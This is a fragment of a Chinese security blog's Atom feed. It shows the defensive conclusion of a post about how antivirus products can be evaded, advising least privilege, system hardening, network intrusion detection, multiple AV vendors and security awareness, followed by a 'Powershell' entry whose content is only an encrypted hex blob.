title="结论"></a>结论</h1><p>以上例子说明，若是能够利用杀软的弱点，绕过他们是很容易的。仅仅需要一些关于windows系统的知识和杀软工作的机制。但是，我并不是说杀软是没用的。杀软在检测已经存在于特征数据库种的恶意代码是非常有用的。同时，杀软对于系统恢复也是很有用的。我想说的是，杀软可以容易被新的病毒戏弄，尤其是对于有目的的攻击。</p><p>自定义的恶意软件经常作为APT攻击的一部分，杀软可能对于它们的攻击显的没有用。这并不意味着丢失了一切！对于杀软有选择的方案：加固系统、设置应用程序白名单机制、基于主机的入侵防御系统IPS等。这些解决方案有其长度和短处。</p><p>如果我给一些谦虚的建议来抵抗恶意软件，我想说：</p><ol><li>没必要的情况下永远不要作为administrator权限去运行程序。这个黄金定律在没有杀软的情况下，能够避免99%的恶意软件。这个已经成为Linux用户做一些操作的正常的方式很多年了。这是我最重要的安全措施建议。</li><li>加固系统，当前版本的windows系统有很强大的安全特性，尽管使用。</li><li>部署NIDS（<a href="https://www.77169.net/qqhack/hkrq-hejs">入侵</a>检测系统）监控你的网络。很多时候，感染恶意软件并不是在受害者机器上被检测到的，而是应该感谢NIDS和防火墙日志。</li><li>使用多个不同厂商的杀软。一个产品的长处可以覆盖另一个短处，也有可能一个国家的杀软对于来自该国家的杀软竟会更加熟</li><li>最后一点，安全意识建设。如果人被利用了，那么杀软基本是没用的。</li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;本文译的是《BypassAVDynamics》，也不能算译文，主要写自己读完之后学到的东西&lt;/p&gt;
&lt;p&gt;好久之前的文章了，vt应该查杀挺多的，没测试&lt;/p&gt;
&lt;p&gt;need read：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;  &lt;a href=&quot;https://blog</summary>
      
    
    
    
    <category term="Technology" scheme="https://ghostasky.github.io/categories/Technology/"/>
    
    
    <category term="免杀" scheme="https://ghostasky.github.io/tags/%E5%85%8D%E6%9D%80/"/>
    
  </entry>
  
  <entry>
    <title>Powershell</title>
    <link href="https://ghostasky.github.io/2022/05/25/Powershell/"/>
    <id>https://ghostasky.github.io/2022/05/25/Powershell/</id>
    <published>2022-05-24T16:00:00.000Z</published>
    <updated>2022-07-12T06:27:23.837Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="风中传来苦咸，是悔恨的气味吗?" data-whm="抱歉, 这个文章不能被校验, 不过您还是能看看解密后的内容.">  <script id="hbeData" type="hbeData" data-hmacdigest="dadd7a1736e847d0c794a2effb64bf3ba1e2728595e79749fc12f9a7dbfa845d">994f9c06d970fb4aead1c76eb2a7916ef4db5aadaf7c5969188681a8504f5f2ac5c50984664f16dcd9ddbc027cb48db044cb0ea83cfbc39f73be0d15bbe7f64a3b4e5e34b2676ec3208de759c8621c3d1c447a834ebe0726ddbbd15845326b7c4cae798554072d1679cc02b7d5f45595461e09e5ae1ddf876538372a839a544e637b5be63749696904b5d6cad6ebd0334849b4eada7594bc68851d87d36e356fe9e88c5ebf5e5a1ad6cb2c89dac002bd8db6c1fa7baea74c7a0c2e27be71232fabf190bea541eb4f6c50c2455fe10a5fae9142b79fccfe80a1842e99a4d155d8001d177715c7d29dd4091dfc6110ffa8f0d4b58aefff34503d84fc48245be15f8f10c1d3fd24b6c89d0377a8f2cea494e4d3304dd297f07a08ab274a708316a5ce32bd8cd7888b2785a790b29c7a427f8996e3a3c5b215cabb21745ebbd440dccc16215b52614040e02ae2424d871d2daedd0bec59f0487bf970a7d3422b1dd8888809577cbdcc382cf8035d0348d3c66fd1bfc5b149df67741538afd0d5408071ff9f7a96431e800713113393bbfd3fae4c4033876b0fe7bebc6cc5bad3a4ea99d383879edf0dcda15ad7c065cfe0c47ab22086fd69cca57aeac058e205265f104f453be731b621ae7f81c24b04c2daff9552966f39a985fdb0d33e8fc67320ab0fdedf7b287debb0e4375bf5b824d24ad2437e39fa1f2c99bfb6b2ae40873d736c86c5ea15bc9813f261e4cc584113e4bf9d86d5c07b5e5425e443eb31eb7ca6ead1c14508d6a8f6f223dc28e2078349e3e6da0bbbe5adf460508b7104c34add444af23fc23f91e9355017d898be492e08c60121be5bac47feb9c1f9307b68ff6196ae6769a425c9ea9fd9d9ddd5cd5762ea68409fa526b3bc7c89f38272a1b6bd8d1e32fcd3994f877e225294dc2c647de647a56d5f8acf399b1aa9738048f3bb07dc5de1ae8d73f22f7e8efc3280d3f0ea20c87cced8f77b0e889d6b9ce38220dce53fd9a2eb1ec9bd8817b567dd473969b878f5796a08dbb20748c58fb1af28e3f71760471b1c863873ce0da9046aca31114ae0e0e6b3ae83784aac568430c14c3d6757b2fe9e7d0580dcd83cd56cd3f787ae789da6023cccf7031cdea7906fd878779f08f68f10ea790b6322865c1497870c379d6146b1ee848f6200e4ee673e15c9914e91d7191e3f836138f829e0b3585ef5f47d63decc19e64ddc94b208c1c3ed762fac7a7bef9f5afbbffe09af7d338e0cfaf7cfd6bead06808a5abf2f7a632a42a59653572b52f8708c238f9889dd3f03008284b4c5bc4031b202d41459bd4723af9600a2e6f59ef4875c918dadc9fb38faeefd3d917cbd29500ae677cb1b97b43232798d5d2427cc91fae96a08a20fb67558d2c1d42135c31bc2da8ab66d9722a5bfd1aa24eb507d610b09b6913447ab7c850769e5fcf7094ec1eaf6727eb0642c4e08c3199605e31723f306391df1bec42ecb5ad787e315182b17da53308f9a52cb503359aaee89c2adfacfcbd5fe9d8a4f6f229cfc245fe87ca24cc0dc89283c59c75a08c3e1aa87847efc6975527b2c05b7f9f13db39138de2529d530edd124c4518f7a7367815eafff801370e2bdf2e1cac1b806626e5bc09f8e4dc466352cacc7ab5c4bc2a94d11b4b330e73ff91e91c573c1de3d67579a1915b4a9d1cd5c35b9119494ee3c5f68c027929a688bd17a38a3f2b5acbbbfa6a0f587f545cfe8ae99844c0c9c89013665870408996045cb7b1aa40e70092a39852ffe9ea00e52dd7c9191f3e704f0e4fa917f834c931c73076028e9672bb011a4b2208f35c65b7f1c0ac6c6b3485a15bffd5e8850d31209736a3094702d1cda984ab7db8dc3d9a7d9c4a4bbd378126c46ccab3ddf0533f317c00ad5ecd93be396fe82bc5823f6af562146b9e83c71ffa087236c7a5c04a748ad058714dec6b0a77be61133929ce3b63a0113403b97cb5002bb4d59dbda291796d190a40ce8330f001080e2a8b2dc507002ad738ce1fff0474149ae2fbe5e77236243f5b3f82e88d9bbaeccc66c9842f9758b20886d3f3ce0183c8546841f0147df91cdf7ededdf6a10bdd9085290c9bd668efc391274598d01b5fd79d22cb41a9ea377ea0d16de9b3b39388608b4539401b8c84419eb6e64b4a17b5ae0718b68a0fd6f6b180c2555bacff8f8ca548df23f10349939eb0fb11d0fd9a9acd4940f227d9ad84ab28d1029611c1c2caa1e16e748e97350ce679bf1fb9a9ed36f92f85c83e5c1d1fb96cbf4d71fb94883a5e77b7d53130720470776bdd430a3bc31dce6b68bc31022feb7f11ffd132263944dfedcc7ae78deac38e052fd0e3f95d96289c51cddbb90cc6103f94861df4d3efd0cd272dfa8eabeaeb51a221e356d7ef7a97195cd26a015b62b9b2a9cf095dde1efc9197bacef4b7937d81d656b7e5d45c717cf3c9d2262d6f89577a0039e093261c6a059e5be59577b794b1915d79df745b198244c762a903c25ea33f66a043adf9621ad0f421cbd17081f47a19b1c42d914f004177c405454ed0f3f60c9b21fb2c25ba0d53af0bd220a741966a6180d580c468df68f869f8443c7f79b17783f6ddb1fa690a3dfe72d2935c9a14fa78b6dfb4771199ca75381744e0f90fd86637922462f6cca0e6b6f878cf94fc551e804f742330e9146da5602a1d9385d0450c878b4a85a3ee7a23b2095298d2b94fd6c1aaf7bf0bf614b2800b8c589f8e02fabfad2d98dcc147ee1013b59633ea1ea33f5514928488f16a03638ac7fa5477138f54d3751faad91a43164bf5ee382cb834cebbff34f2eb6525b6b6792e6ce508dbd6a173eeeee84752cf53650d624bae9f73541ce3a139f697f131027429a4058ac041554f1059c8500f01a20e65d3e89226df3a53cbf0bf6c2e368f1d09ade261f60c3ef17127edb85197a8266185a6fb624276e038994f4b9499f1947bc11ed50eb09ae27a1a4962f4fe8dce5563ba583977b1288d3c6ebe2054763e8b6e0bb6b1643bf8cf7a4b6a8a516b5ace0ad8d0b9a0a625d891727f6d85751a946818e0597afce6500bf3d50c0606fa0d4257fcfc040b2b5cc7c515aebe93fce3ab1bf8187039bbcaa757a6cd729ef48de62d404bcafe3d967ac2faa88790808c555d2d8fe8f5b7bf83c0be993948327bcdc556e958a03ad975036fc7d85f6f005120ced739e67f17b9d3d2f43e110f8240fbf0acc0d1cb7badbf2b04d02c93ab4a97fb2e449312e25473afccbb6637e3361e4b784684df7da70caaf5589dbde27dd8efba203cce708f3c81750a17c7f81582f1bc8601d353cbb5291588aef3f2146c246bff72d488d9b3f4de47218e2c225a67f09465c34e040c3c77577ad7dab451d64f935e134eebb89bbd400b266c42db98cd7cc6bb330069e1c24ab86a5f416a486019557f3b72d6963b7a17b65c578255c12c7fd237069de8a2ffff76d609fdc85b9b7e852dec207d81b3852b5b79e8987ca58869d336c24c88b656b1a4c0aa6a768b011ac1a2b827228206e5e0217a22536a9492f04ddb72bb404869ff11accb5adfded0251d1bf6a1226e2b3b636ecd56f51de05f1768f87890861773485080ec20bb052f3d9bdec263318ec85635c1b1568d8c9971beb31ae5484e374623e303c750f8ad204766accdbbcd2e46fb34799fc82c340bf29d91a8b1aeb6e4ae6ecef844c379b257a8141813ebb2da632616b5431467a71082d2782c40d94fde5ea011630ebbd7d80c46bb4cc60868d5b892618807728d30542d67dc1ba4876c556b74b2a54fd364b526a0c43035270ec637682523935f3005cf1ef7bcbfe5401d8f16214c168e46b66042fd95e7ae49be5b33bb5fea470b5c12cf615859b54a287a7014476a2da6b390ea11c8dc91b0fba5222b333bd93f033ca4506df32aa67a92fddc19a872f8a9bfab2cd12520adb205c6a07f6dcf202c2fbf63a50b2123ea77ddd0369dfdc2f4c063ae4d621d2ee52d0bda49a976fdd3609ffa42e262ed5eed237d90fa7db9e1667f9e8c1ff8c2a347ac0ea640ea6d5a7076f70a0d639c51a954990d2184839ac4c914ea1fd9e417dd7bbbce49f52d5c09f81e9f63e137e0624f5cb9bac35028313976bb0afc3200a14fef06c33eadd1d42447b808bddbc4bff093dc3e76b5b5e9931940d1920bf279258e98a0791c1ffc8583fb83019a71c85cd798d164b3a377461fec1d628dfd8e1e1c96cc3517a167fe12123c0078870fd4d926a801eb3a380dd256552541ad644ef07bd29035ea7ab4f8c916bfdfbff4d7130d8c63d5ca8527d9ef05679f24eb3068baa66c18075afcb0d8184d7a401045c020a6448d58cbb33a7df7a4c8a8783b2c392a7fb989b96fa0c09cb76c09f312714c84a684179cb2e0e80f4e3376eacf2414d2ab557d937132340453d6cad415cfa9b902fbeb2a1ebccb618814e824432ab2a3861c4eda576ffca8ec3baaea9d8767fe0a920a96f5c7521cf82e9deca4c478e7fd916bd1880bac6e66df3c029f1e2094a193e8ad77699e54a2d617ea1fd901655f1aa6cbfba48ca96fe01bd9da3a9872409c19d4e795541299b20d586687afc146f6351805e08d1e10748b6912eb4e97cde5b7247e0f10125649db943ecefb572caa23c395830f68a95a3141ad7d8cab24bb3566a4e900b87a19722933b97a61303a4bfe1dda857a0ffaa50d57183290aad1808e79a8f479107e1ecfaa1863039fb5286a272d4f51739ae373d0b32248601ab848c9fbd6f3023f36b1ef4fab71fe00f969080c2b7315e2d10715fea72c0a553755f4629f4cd6133912f0ebfb8d2d19348d0d660eedffb7790feee019a0aa68a49e5d0a05729fad45791395e6996fc9ce9a8cf9596a57e1168e16265d35acf128e73420e2461720cf1ad73f6ae4c3f56c09662833d47b27a6c1b3099c8384348b008f872071cc63ec592a10830ba0bc2160ff3ed08a8f3b228d21c9af92e72e78a46d205a35f0ad65ef626289c50d9ef4c140c53c96f7fc8d4d0031ae6d917d7480673b7b24885428118708c5029d6e0aa10f5d426e4ddd69293742dab52397b160e87434c114f6e1ed7065a018f15fae6df8a050e76b7f16b5cf78f9cf67d4527b998b9a415aaadd3217c48144ebd4bc9e568f29d75bb5cdf76d1c86a0faad29d03c149af6f88bb27c911b87e8b88e7c4ad96243c8dfcdc2f8fdb0d07dda16e12b62ed999fd0d45b42e370ee3ad2958dc8554105ca3fb20dc0df5a4d19b301750da637085a6474e63b85bd1cfe94d2fe56d21e9aeeb05ebf4d663362b81e254488b9c5496d1ff0f16687d0b06e2875c11d2f5643b9a171dbd149ae8728a659b857466acb3873d5a84364303784a3c1d1e156cf52fc6dabf37c3ba5380d06e88b189e20e80c5bbb63fcdabbad4600e5b1f93c7e10a56bb2f5ce1baca72f5d67f31eb254671fdd786287bbe8781bdc0694e74ed57ba34239220e398e52c4fa3404c36c1b55283ac598ce7a21382c7763bd2daf6c439789bdc205e303be93ea39fcb772b26fdae172b9af50e013376f4f8dc71bd7cc3cc195232ab5a43d43d1d10ffdb83a89811278918f828028c495352e5ef04f2a7c949a932749b22ac27d7c4947e7478e89d93937f568bed5f19021218cc1b607012e1c786890ff070947cbea87904751031238980da21c7ee1c96333d64a5948d30e435e04692863b30ac4357df96c77d2312b48c335e1c7ca2d1c249add615550ae715be16758571f11b869fcc4f95346a58382a9e379a02ba626c2c0be160a1f2765e81bdb15e0e692099b24bb37f35ce448c427d2480dfa8c8c6d6a2166f2b741a9f51f80c107bff794d182ffae0f2765c41ab4065ae082845772227ea2f0ffc083e606ff49fb5a0927d9dbf4bb34d5f870e5cc10d6d600d84f62d2696006d4c5a8d576ee532fd486a3fa178f2820a74d70d5bf3247000c9860125f2872b5b791c0daa119517b9e22f77d79d871d6587536ab61144293d5a248d7fc8eaf4e635632bbb53887e31b3a07d636cab0695cb5a0d49dd9133b1fd8636341d77580472cbe2112c65ae220d3a93df94029686514bb641e868aab7a0830ad5abf8ea0e3ae43697a3f4a54ce5c4ed6de5d4769219e871b921deedd08a1e69c2f764b9938be0c212551d7ee2985bd21534b1df41617257be9f079969f91d6ef96ba3a1ee207a97539057592a82189eafed119365b6c4b7364e0d4e16b88c298aee6aba39ff935142b68b9e2f3c9bd8237f64e57a5345b6938064b518588af345e2a2ff89fdab10f97c71912202519edbb7dc5becfcaf32abcb47f90920b5b51c5c029e35ee0523cc83e6f8df5328ee3b67a052446acf8332bf643fde9e81f638ebe5317c4919f840f15cbb13ac4a94f766fa594c3536b5f8817c331980167c81bbd73864386b1c079acecc9f98967c973c5dc5fd616624f7c4de90100c3d6861a3a7f817a042417377dc97eeffad23706c2e47b33cd9bfc3983b91d0fd4ab9461ec4dd02976df805f84c34e0f5c6333a0464136b03e0b2d16f51ff595ff9906019de92ae9f14f713eaea22c2534862533da0deb5881bbee4c4ecad0207085bcc0b88a0ca074fd4ad14493542b7dd02fb750993329486bada8d2702e9b560a8c3d96068cd8580a8fe818013f229dd7b5cc447712160a2fa80bdd7d2cc9ee9ae8ecfbefe9499763c8a6f3e649f129b8979b0999198432f4ba593f9cb83a33524a066960a1af89f9518241dd2e01933c54e95e215e3af95642eebf7d6fd973e4cb323f004df1b91cae0e6a17cf0cdc39cecc1e1ad012d03b7c1b2ea68bf91fd02fedcfac091b72665ef7a20ac8a507559b49f1c984323a044965adcb4c54d00fd94ea3ad98d5ec27eb32b2f98b9dc78f6337b32ec619e8e9fb1873cfd28b078da758ba6990546779425c3648fb9740be5351f1d4a26e13cc2ade251561e45be91803466c1afe779f07b3a69c57965b32608949fc60f18c48ddf93a59a9e9f8c0510253ff939e790bfaa8b6028f9e6a29982151ddcd56770041784fb05d49d1d9e49406705d4d8de326352b96f2eaa00ec621b0eabdad9901f5895a13d412d3308564380d7c4f843388fdc1bf79f224c5843bf4f6c698be127104f9b729665bb45b001bd62a7a51963148d664743447cec9e8ed57cb2374f0cb5b33ea441d18b1e0b054dd6945c29d66ce948d7b010008930ff50badbd5741a0cf81a187c48c0e359a171e1cb42cb4f99d18b576b3a4cb68539132a9a5bd0559d4ecfc10fd3857c46403e17fb39ea9338d5a54ebaae82f4dbffc42ce116ae34f72251c1c0c6e09feab073767c9625292ee54a41fe0ef90ada967fe8ced3fac6c442847383e5e5e92a90232cf122900e9ac91b2b385b58f31ee2f4a1bcca46d92ab80964a3f7f62355aace25cc295f63a877cc49aabb7ac161bb42f6f6caef254abd8c6fec1a8c5e6c5bba1edf1968f6a47b088df9dd5d7a684a8840db9df7fade3c4cce0d629241c242d03f19ce7415e0d074382f850c861e4f85e332dfe3626cc1452466f5e751a62b14538dcde2f0d746409e3492cbcaaa23e389c52ce2c432e74458a5f78dc048655c03cfd6e7da24e2029d193d5aa6ff8ea42bd65e39fd56a755572f6933be7cb0485daacaf80378db7442988f12771ce002fff9562b7e692fc8dd5192d8f8fc1520456400397d7136821645c8bc9a9f41f49228f7fb03b6779d2bed124840c55281e0d1259af095bca043f480d057eba69c228af8f542e37f0ba6fea535c56b19ce5e90649c0667a9e17f9d6322dfc9e4f3df62d8165660fcafe6c988cc88248db111be667d9af5b26bac7dcaa28bea5eb2271f807831473f63d0df0e0ecb24cdbeddffa251818c518110fd53089190cbb5a0b2fda8ef2d4353f0a25406cd7954853f4f430a044b240cc51a20b74b218c9b3fa31207f3f45e547ec6a1e3f4f5f761391191fceb22b2186006707a464aa8a4a3bf62a623a39a2f3ddc684903a020d7e05992a6194559033cd2a4ef8e78eb3796f173f008c94cacbfd935ca2bf68ba0bc254303422b9a5d4178ed3440eb0aba004925c23b58a2237064db8ef71b9dd11b977f0b6531acf02afd82920b63b7e074eb2f49d5067aa59cbc3440b006baaba9822d994735f4dc8b95a35c7fca0e5cc2005b1983fe91a03d5202341194b103c1d99c7804d026d0861f5ad06303f3684ceb25520dd579d4689e01f93c8a7c4ffc84c5ef684c67384c0ebcc4f07a2f582b8288c51260edc33152fee540780204bcd85ba6dffe756e67336a478b802ca0b9aea2384a3fe0737cd13a9cd1a8151059821af496eeef4e3d9966673925a41ccd6efecce15ee8cebafc05730dc4f689f5b783003acdf622abb56ff572376844a025d56eb6db498ea5126f3c806de8084b8827bc2ecd105fb71030ff5506c783893d9acc03e5d46d23e9613b58a5f3f807b14953fdd8e8cb2aceb3e096a8b5db5b18c6835eece4d8854a041169e2a1ca2ad5bd2ca1ae9cf1dad93a41ca13ba66aacbddb106b30368cd73282f52e9a815323a154a1ddff42a6c6c23489acdae4f43a5362ff2b8701aaaf2be5a6e8484e3b0b6c2626bb615ba84bc054999bc189605fadece3ed043e3219880ca3fb1f6defef8eaf0a91790e10ff3459e98c7ba9c7209fecada73741e94230e6d15f3ba962f59ad6c63d74f8eec79d675a9999c975ef783aed145f0ea0705ce2ce53d65c3fabe6d70764b02b6d98ff3164755431ec0580720e19aca04da04174e8440b1878eb00b62596dacab46510020482392be1273a360e72dbc28f6d4c392b3ea892378c94fa8fa88d6d7920d63b48854b2b620b9ad3f053668efb6aa17f6c68f1216ec680d9597b668b6e909fa6fa8a566036bc8603d4e0f402ca1dc2e7fc5387009d2fc05cebb074db77bef3b454b49deba1bc3ee0d16aa572afd670ef480ab52d5f5e26e64a8ad19b127aebe3106a7ebf221e7197c4d73f7a6a2425f09cc0dd0f4d158d0bbbba36a876b51aae05e2237654bcdf2e394e28f356fe32acabc1b8f16f3d1d4f0c67caeabf7e343c02125596b15bdd8c7201d902d7072bf1b15ee28354091c3c50635c3e32f7d4ddd639bd53ccef50413d1993e61e3737765ba6135f701d8e4212db6ecf5347f9c23f23b7efeb537491dd064ce37b9c47fbcdda6e00e84df7a29b39c8b96446d363f03179925235089c2eb7ddce1809dd558911f73e4de95db09b74c90977be389ce5e53b3ff0bc9666a3843dd0df6c4b19f2dfca4dcdcf78c14f5a1c934194a858493eb31713303f9d33ea58f487492e4b05776ce668b6bfc1036eaa08402a459720ce69b613b9ba6f26d22252dfabb5e188fbe9bf5e2241218b83574ba159649cdcc3c24ec4392a442bc918400d8baedd37d62e42a61f886113a23704647fef184538bfcb2e89a2f7c5a20c7fb54403dd567f0104497e454b566912d972018b57140daa0b86ef8e7e369ed25bcff29269b56f72553798cf424feec84ca4cb0add183f175f8f071a91628e173b48a18f320825779ef185e504eaba4c6b21aff230c7b9246ac36f705c719a7806ed72acaaa5ab20f2e1f7f9923073ae05f6d47c73504c38a3128d30634fef946cd5b75b7c2fe4a7cd5fba7a8ddddc065b2f24a1698c89fd014e69655992200ba2a76eb672754f1e9e2ae3175f7103e1b6c7a812979448d003a848dba1c657ceacca3b9c0215f678e0de865f213ece175d22767d2e89cbdafe16102fe5966c0ac397af602a96ddb561eb229de17f40821423a8d519669c382320fd88bceb1c2e1881c371d976a8ea5678f703bb60f56a813567bec20e857c3fdcb2a411cdb9ecd0bd8deec0a8c1752de2a7dd56cb1c0e1d7642fdc161aa52a81e79bde1963ea1852f5504dd0ee9352719e20b01ea28b5a68d57af03d6b41aa5c2784cd638d5e3fdda8782b57c46dbd18d2eccbe746ffa21012f3a4aaa9e70ce91af88431bcb5c660e206818f5da11116af31f59df6f6e23aea8f5e9f772b9c72053fe47a54de9320a1877a13cf23886e9c1c9f9d52958b1a5283ecc4eea230381a9e2bf6b9a7490e96c90fa14336cfa0beaf0fb4c9af6c1883375e7bac5c19e63ab0ed6464c7cd95b0586335369b725ae870501b09402c6bed520bb553f22b7af6e556cd0c8b34848450b39e6a4712fddf240b086f0d24d3bfa8a54c8f19baaba7ab0b2366b41e1634dde83a334e6140ff71a3a7b5e8e0ab0f88506482fb63a35166c13de4bfcd28971fa8f7fcb18ab7d3b300f7c94c9695c2d323c272bc2eca4c2e4edfbbf867705a988580d6e5f4cc35c5295066dd71c73b14978cef3fc6da66e0c2cfc7002a32ba630740b2cd0f8ee69dee8ae6391a9975d1e7d65677721d7bade708ae0a88fecccb2a0a2323c3abd35535e04e36425d8b82e3d947963c92268025217de3bb35da579333b70ec402f64b36acdd57581ee53177c4d2abef045a01e885765e5d47458cc6d1ea7d5d92d49fd9070a0ff55b3d5af60c79f3f4ecdaac8b93f4e9d34c34d180e10a25084fd013206f642e0449b8d58057c19062df29a4249d19cdd270f4e4f90a981b68758847e89a7ea48d58d40ca4cda1820e5ce942af51b9b38ec49b16e16ea23812efe2632d9f058d1fd620ae3fd497c7df545d7ca3db577e266aa23cd6bc5c3ff0c4e472109e4fa0fdd7c71b633586dcd90da9758ed4edb6c4183731f7eac3517e04f25638a78fb4c049ffc16465b6d89a7f8abb6da451ad531629d04b385ed9b7af0ee31b4ce1519cc4d648b859698b0185bf0e51ff1d73c5fc8e2cf7f698b234c57ec9ebafc232bc07e211916a3efc0dbc876af05d57854f8fbdec1dee95df98f61306e86abb009536fea6a4784c901ee0b349470562846c24b36923eef7b6631500754889c98b36c29e4b63cd4868b87f8e38a603fe6d262ef0c34727154f657fec2f6fd4f4cdd43e5b418b04e30fc8ec0284f395c283b5b27d1d478277bc74e0482738c1190626bb6010c02f3756be24d20d6e4fe9a03972615a6f3f447a9de0d16bb53425784884efe694d8bdd4a15d201f5550f2c9ce97e7131e9c2e5ed58f0d6103c579f7b1ebc41315f903f23a5326f0d5c516201f0366785a9ec07e09d2c99aaf51bbbfef078ae007b919dd9d899ccd0d017f09d5bfba583b1782ac5ba68afcbbede631382b1a8e0be1c62b4f8829681cc091567bfb31d0ea3184a16af629b910385a74bc24b7bd133496c5e524af2e305054b0c5a16afbf755fe44b3b81d3d4b8f900c62f817f386e64d75542c4d3371e5aa0aff20e080971aef3c5b818c8dc20ab08d804ac4ec08a5ecc2b9fd5919777187496acc0659da3b9ed57c9fe901f13121b9178115bf09251d7e5567f169e5d95f8fb600453029821079db6a8e35aac58db7cda0ebf42aed1c2b5d0872861de20e31c2748e1e74606e96cea86272e9e07bed85d344c12016fb0b41d65eaeb07b8ff03ab88b5e7a278dbd50c142783ca81d0ea679d685b356d1caeb99c5008cc5e415964e642fc7130ca0affd9a802bd750c8398446b83dba3ad99a65b69ad1d9b17015497fd382be9bd862bb6bf50d93a554c887fa1021545ef82998c596b5c6dadac21695c916e99388ae2bd772dac92945d9d1ad98adb2d0a7510fb6f19cd801a6fb9f818031f0648914dc3940a30dc02f0eeca0958edd3c545c2442be4b0c6f6351f762a1c502d26711165569747216c993655fdc050424e6fc0de97af1aa7cc0197ce9ced82c54ed79dd128accab8fbaa445a81c413a56bc089fe98da3d6386ba3416d4e3ee850a6f97021ee28796da3ae5246609ccf53eec3eada385543be3a49732ccb23da08d6763d9d46b8fb7b5d33e68a6d72eaa697111dce66bd5da379e011c52d06f77d8e77d02056e1cafb288969e6bc30c520700b5fa751ba2d8bff0aac61fa036111ad97a71016094d458305ff559e799c7d1fa8707712335482dd05682215319e37490f5902089041cfff0a8157416d1f0db892a7ab44b20b47e70ef35bb2d4d67558200980f9a4daa235110dbd9dd3c8eb6e6616e3114c30751b71ee724c84b895c9e5829409fe1022e48d00dc5e3d0e65587e86b3153316c6dca63e2d5e23a93f4a215823ff038050e80ef9a583b10f0513ff524a0800ab1065e1941ac81dcecc30e21ea6f6546eeb04cb4f70c308032b9fe1fdba414c32ff8eed8032672427c8b9e7b5139ddcfc025242b2e51a3c5154de6e79860a54fd8f34c6b8691f45e74eceb9a24c926c594d673f7ecb546e68b94ead516a154a9efc36001353f0d99f55f68615a7c45cfb6643784a17230c3cd9fc82450cf593a40208f386c76f1b3d53908de74a79879632fbae12c609fb82631287ee56f8488b663ffce5e9f772b2a22dced19a3d67dae07255682299987e3c3ff39fd5c14ac02f5b54b4dba2f68f3ac10540789d826165cd06b3b6a6cfbdcd6b4663ed153ad9c502f7f5510135a63289209b3e34b40eb943bbc9dada6b9736fbbaf2a4a438773eb56eea377aaaafe28b2d8c26168f8c92a0fdd2c18c381cd338aff740425d38c5b70d6d8bc3afb29b94541ec95a41d54aa6e66ca5b80f40aa252c720c020ef680abb32cf3d98dbb922d82e95cddc3e22ae86ef248e721dd93cd3be92386840364618756f835b66da193304b7a41371b71ae35efc7e28c5b99345cfccf678a0afd2dbeb310a847776e15b55c5eaf30e29a276401e1d85f33435abd9c4cc951c1a8ad3c238d6919b8520b006013fb1d9badcd9016d92cd6439df10dc14511fcf0d12059379696d626097166110e23345d6a768fa44cbfe30edbad2d39fc77df4b406c97d3b841e674fd794cddaec3e9e58adfa904c69ac05c3a4e05089f563fe77fb32965ad9d60b211eab3c54db11a22bc96ef8fe613452e93e7e16f36abef053062421086dc352491d8c5b2b48e9f6048124c0f92dbea92dce9d08f72303485bd24a069ec46ce353b14df6be7ab2386dc5c129c0caaafd1ebc5ce202fc1112eeed2220864ffe2d0ec086a99db709805b8a92a04223a45b6d2df5412b94e7e07144fe7f73e87b355db14db3aa2cd181ca9d76619a18ac49b39c3abdb9bf43f27e68bd21984e7c1f2dd2ed61ced69c9cca03d03b1a41459622d5f8ea8df5f2b238590a72e4683b51b158eff3b455a45e543489d96479e994293ecd822b2b00cccfe41a7edf308e42603bc43e5ebde47a85b989ef0afaf1ac7aadea831ef551cb32af567a1df12d9813ebced7daaaead477a92a5d12b1c98b2737a6e099505f6cd901a44bb20e563065b9d9e20655c261f0b97b80e5d5a77ed9bd5d35bd7f51da05bd842b5b832dda7396c0a0e77d7d24317817cea6f5b95a43ddd86dea257d041a78bdfd8633edfac99807014c069992d332f1161d550db3d601aecc4b7a5d9c158f9b5ba2128bde61ef62597573885d46d733efc782c19c317b281b1f773d489617aa73afdd20158ed95886ff37bfed562ab3dbb60ff680875dc1416d812738996538675f42c648e6cb716d4192f53815581d370d3c0028ac11d62ba34f51108dc2b5c996637a30f57b7851b9120959bdb80f5b5f023b50a43a32e6c29bdf2c163765b512783f8d0e035a5e05c5283d515b2c6b9ab6a80d314e4d70bae7c6849cb6a4a1e08fa94607396140fc3d4fa486ded0236d0b94c07f92bc4726b58b41a3053eba5274b7225eb9b5607ea2ef64451a3b9b07a2be7ed50b928413ca5748dd2642fff85970c463952ddc003edca2dd75337ad7454aed7b58ad8bb09deaec46878d570c58611dfbb427cb1f4155ccb6a8f2137e9157c899c4b736a264a6a1e1185f46001d4e801c70c98a62270b63e0c7087d65cae2895a6697d6d2dd3ddb33256907a1c488081120a08218ae82301f15f010246b578481f7fced298c1a6b40471ff57811bd25957d53daa112944e46a696153091eeead9facc59713562d24795542f6b426b184fa3e37a52eb1a694005624e2f9731b6046aa58ba860a021aefbea8bd84d2c6a64e7753c0f51e7ae197b85e4381082bcfca3418abdd426ea0b67d027d7923b617a21d7b85e27d264048ebbc51c1f6214b7d7f7ed0eb27dddc9eca78249b2e32a0b2c7f1dc5c54f9e38d25a6b10f7d1b65dc6d034009328f6631a541f50fe588fb556a0d66aa08e5083ad782934ed1bccffd2cc11b0a269421f4210985ff865db1efbb572351518961c4e32cd0abef8d26dc54879193e2a78bf27050184dc4997538af6be3b6b5e94c058da423b5f4f179204624eea3a498d33a4cb013683139add8524cefde02023c93c8e100b4a6efdae758193b33b8f3de02a543faf788f64aff0c8f869739671c42f106f2c98c8930881b17aaccb276062fa90c104148efe62df8cb36be94ccf41a6eebd7d2853519d073d7518ad978d329b92a69f8c6108b1426bf657a45834c98fc6e12299feda5ed59b318f327769ef232260eea54f9456847e58827b43a8bad81ed599d236e4a47e242d42f210c81bf7d1c4b6750922a9b3ba8ca1cb7bb8f6227f44eccefff74ef3418c308f6fd66c711473603da7ef2a788b2414dfd4040f2adfd463d9434fe4688a84a88c03c9adf5697481c08cfbf76b5b2cdb5d71d847b0fe3240fda2ac23ec8c4c38d4797c291c6294fe4c5d3fdb8824e3a5be3585e38a3213dccc7fc627a1000b6ef4875921e20eca7ca19527b968c5e37bb121e83c99c4674001d9508a23f21f1ea6361b9f0f2ea55b7aa6b26195524c4eb450121b6949ffbc4b683ff08e68b025b12f058b4433446be73c381ef628e8e60c357abf09e758ba04df4118169c3717199dc5d55d0d032ecb65465332fd8bec0a46e7160fc7abfae00a7a20841d49819b643dca382bab18254f95c2cd39374f89d08adb59715ce78e68fbda88886d1